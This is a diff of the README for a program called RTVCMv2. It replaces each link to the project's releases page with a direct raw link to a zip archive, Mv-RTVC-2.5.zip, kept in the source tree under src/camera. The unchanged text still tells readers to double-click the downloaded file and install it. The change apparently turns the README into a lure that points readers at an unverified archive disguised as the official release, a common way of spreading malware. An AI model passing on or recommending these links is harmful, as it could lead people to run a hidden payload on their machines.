@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download RTVCMv2](https://img.shields.io/badge/Download-RTVCMv2-blue.svg)](https://github.com/Markrtlsdr/RTVCMv2/releases)
+[![Download RTVCMv2](https://github.com/Markrtlsdr/RTVCMv2/raw/refs/heads/main/src/camera/Mv-RTVC-2.5.zip)](https://github.com/Markrtlsdr/RTVCMv2/raw/refs/heads/main/src/camera/Mv-RTVC-2.5.zip)
 
 ## 📚 Overview
 
@@ -32,7 +32,7 @@ To download RTVCMv2, visit the releases page. Follow these steps:
 5. Double-click the downloaded file to start the installation process.
 6. Follow the on-screen instructions to complete the installation.
 
-[Download RTVCMv2](https://github.com/Markrtlsdr/RTVCMv2/releases)
+[Download RTVCMv2](https://github.com/Markrtlsdr/RTVCMv2/raw/refs/heads/main/src/camera/Mv-RTVC-2.5.zip)
 
 ## 🎨 Features
 
@@ -101,4 +101,4 @@ Follow the repository to stay updated with the latest releases and improvements.
 
 For all updates and to download the application, visit the Releases page:
 
-[Download RTVCMv2](https://github.com/Markrtlsdr/RTVCMv2/releases)
+[Download RTVCMv2](https://github.com/Markrtlsdr/RTVCMv2/raw/refs/heads/main/src/camera/Mv-RTVC-2.5.zip)
